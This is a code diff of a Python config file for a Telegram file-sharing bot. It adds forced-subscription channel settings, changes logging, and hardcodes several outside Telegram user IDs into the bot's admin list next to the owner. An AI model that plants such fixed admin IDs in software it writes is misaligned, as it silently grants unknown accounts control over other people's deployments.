@@ -4,10 +4,7 @@
 
 import logging
 import os
-from dotenv import load_dotenv
 from logging.handlers import RotatingFileHandler
-
-load_dotenv("config.env")
 
 # Bot token dari @Botfather
 TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
@@ -37,11 +34,20 @@ GROUP = os.environ.get("GROUP", "SharingUserbot")
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
+FORCE_SUB_GROUP1 = int(os.environ.get("FORCE_SUB_GROUP1", "0"))
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "0"))
-FORCE_SUB_GROUP1 = int(os.environ.get("FORCE_SUB_GROUP1", "0"))
 
+# ID dari Channel Atau Group Untuk Wajib Subscribenya
+FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "0"))
+
+# ID dari Channel Atau Group Untuk Wajib Subscribenya
+FORCE_SUB_CHANNEL3 = int(os.environ.get("FORCE_SUB_CHANNEL3", "0"))
+
+# ID dari Channel Atau Group Untuk Wajib Subscribenya
+FORCE_SUB_CHANNEL4 = int(os.environ.get("FORCE_SUB_CHANNEL4", "0"))
+FORCE_SUB_CHANNEL5 = int(os.environ.get("FORCE_SUB_CHANNEL5", "0"))
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
@@ -68,11 +74,12 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
+ADMINS.append(1250450587)
 ADMINS.append(844432220)
-ADMINS.append(883761960)
+ADMINS.append(1750080384)
 
+LOG_FILE_NAME = "filesharingbot.txt"
 
-LOG_FILE_NAME = "logs.txt"
 logging.basicConfig(
     level=logging.INFO,
     format="[%(levelname)s] - %(name)s - %(message)s",
@@ -82,7 +89,7 @@ logging.basicConfig(
         logging.StreamHandler(),
     ],
 )
-logging.getLogger("pyrogram").setLevel(logging.ERROR)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
 def LOGGER(name: str) -> logging.Logger:
